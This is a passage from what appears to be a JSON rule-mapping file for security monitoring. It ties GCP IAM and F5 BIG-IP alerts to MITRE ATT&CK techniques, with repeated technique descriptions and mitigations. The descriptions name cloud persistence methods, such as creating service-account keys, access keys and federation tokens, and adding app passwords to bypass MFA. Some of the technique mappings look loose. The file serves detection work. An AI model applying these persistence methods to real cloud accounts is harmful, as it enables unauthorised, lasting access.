            "Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.\n\nIn addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment. In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access]( While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials]( or assigning [Additional Cloud Roles]("
        ],
        "mitigation_strategies": [
            "Limit the number of accounts with permissions to create other accounts. Do not allow privileged accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."
        ]
    },
    {
        "rule_id": 65071,
        "rule_description": "GCP new key is created for a service account.",
        "mitre_id": [
            "T1098.001"
        ],
        "possible_attacks": [
            "Additional Cloud Credentials"
        ],
        "description": [
            "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts]( adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code> API in AWS to add a password that can be used to log into the AWS Management Console for [Cloud Service Dashboard]( If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts]( For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator. \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials]( tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.\n\n\nIn Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account. As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user\u2019s primary password is reset."
        ],
        "mitigation_strategies": [
            "Ensure that low-privileged user accounts do not have permission to add access keys to accounts. In AWS environments, prohibit users from calling the `sts:GetFederationToken` API unless explicitly required."
        ]
    },
    {
        "rule_id": 65072,
        "rule_description": "GCP identity and access management (IAM) service account key deleted.",
        "mitre_id": [
            "T1531"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 65073,
        "rule_description": "GCP identity and access management (IAM) custom role created.",
        "mitre_id": [
            "T1098.001"
        ],
        "possible_attacks": [
            "Additional Cloud Credentials"
        ],
        "description": [
            "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts]( adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code> API in AWS to add a password that can be used to log into the AWS Management Console for [Cloud Service Dashboard]( If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts]( For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator. \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials]( tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.\n\n\nIn Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account. As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user\u2019s primary password is reset."
        ],
        "mitigation_strategies": [
            "Ensure that low-privileged user accounts do not have permission to add access keys to accounts. In AWS environments, prohibit users from calling the `sts:GetFederationToken` API unless explicitly required."
        ]
    },
    {
        "rule_id": 65261,
        "rule_description": "F5 BigIP: Virtual server is during high-demand traffic event or under Denial of Service (DoS) attack.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65262,
        "rule_description": "F5 BigIP: Platform entered software SYN cookie protection mode. The system has detected a SYN flood attack.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65263,
        "rule_description": "F5 BigIP: Stopped throttling traffic likely generated by a DoS attack.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65264,
        "rule_description": "F5 BigIP: SYN cookie threshold is reached. This might be due to a normal spike in traffic or an attack.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65265,
        "rule_description": "F5 BigIP: Detected a syncookie DOS attack. Activated hardware syncookie protection mode on the HSB.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65266,
        "rule_description": "F5 BigIP: Ongoing DDos attack.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65267,
        "rule_description": "F5 BigIP: Created/Updated (AFM) BDoS dynamic signature by the AFM bdosd daemon during an attack.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65268,
        "rule_description": "F5 BigIP: Number of allowed new connections per second for pool member has been exceeded. This is due to a normal spike in traffic or an attack.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65269,
        "rule_description": "F5 BigIP: Syncookie DOS attack has stopped.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65270,
        "rule_description": "F5 BigIP: Syncookie counter exceeded vip threshold. This is due to a normal spike in traffic or an attack.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65271,
        "rule_description": "F5 BigIP: SYN cookie state exited. The platform returns to a normal operation state.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65272,
        "rule_description": "F5 BigIP: SSLv2 is no longer supported and has been removed due to numerous vulnerabilities.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65275,
        "rule_description": "F5 BigIP: Too many SIP media sessions have been established for the current configuration.",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 65276,
        "rule_description": "F5 BigIP: Critical error for TMM. It restarts. Attempts to reconnect will be made after that.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
